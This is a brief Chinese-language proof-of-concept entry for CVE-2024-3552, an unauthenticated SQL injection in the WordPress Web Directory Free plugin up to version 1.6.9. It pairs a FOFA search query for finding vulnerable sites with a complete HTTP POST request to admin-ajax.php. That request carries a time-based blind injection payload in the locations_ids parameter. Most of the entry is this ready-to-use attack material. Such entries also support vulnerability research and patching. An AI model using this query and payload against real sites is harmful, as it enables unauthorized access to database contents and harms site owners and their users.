## WordPress-WebDirectory插件存在sql注入(CVE-2024-3552)

WordPress 的 Web Directory 免费插件在 1.6.9 及之前的所有版本中都容易受到 SQL 注入攻击，因为对用户提供的参数转义不充分，并且对现有 SQL 查询缺乏充分的准备。这使得未经身份验证的攻击者可以将额外的 SQL 查询附加到现有的查询中，这些查询可用于从数据库中提取敏感信息。

## fofa

```
body="/wp-content/plugins/web-directory-free"
```

## poc

```c
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: <Host>
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

action=w2dc_get_map_marker_info&locations_ids[]=(select+if(1=1,sleep(5),0)+from+(select+1)x)
```

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405280854244.png)